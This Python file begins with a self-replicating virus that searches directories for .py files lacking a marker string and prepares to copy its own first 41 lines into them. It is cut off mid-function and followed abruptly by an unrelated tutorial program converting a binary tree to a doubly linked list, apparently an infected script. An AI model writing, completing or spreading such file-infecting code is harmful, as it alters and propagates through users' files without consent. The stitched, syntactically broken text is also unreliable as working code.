#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python program for conversion of
# binary tree to doubly linked list.
class Node:
    def __init__(self, val):
        self.right = None
        self.data = val
        self.left = None
 
# Global variable used in convert
prev = None
 
def BinaryTree2DoubleLinkedList(root):
     
    # Base case
    if root is None:
        return root
             
    # Recursively convert left subtree
    head = BinaryTree2DoubleLinkedList(root.left);
     
    # Since we are going to change prev,
    # we need to use global keyword
    global prev
     
    # If prev is empty, then this is the
    # first node of DLL
    if prev is None :
        head = root
         
    else:
        root.left = prev
        prev.right = root
     
    # Update prev
    prev = root;
     
    # Recursively convert right subtree
    BinaryTree2DoubleLinkedList(root.right);
     
    return head
 
def print_dll(head):
     
    # Function to print nodes in given
    # doubly linked list
    while head is not None:
        print(head.data, end=" ")
        head = head.right
 
 
# Driver program to test above functions
# Let us create the tree as
# shown in above diagram
if __name__ == '__main__':
    root = Node(10)
    root.left = Node(12)
    root.right = Node(15)
    root.left.left = Node(25)
    root.left.right = Node(30)
    root.right.left = Node(36)
     
    head = BinaryTree2DoubleLinkedList(root)
     
    # Print the converted list
    print_dll(head)
     
# This code is contributed by codesankalp (SANKALP)
# Time Complexity: O(N)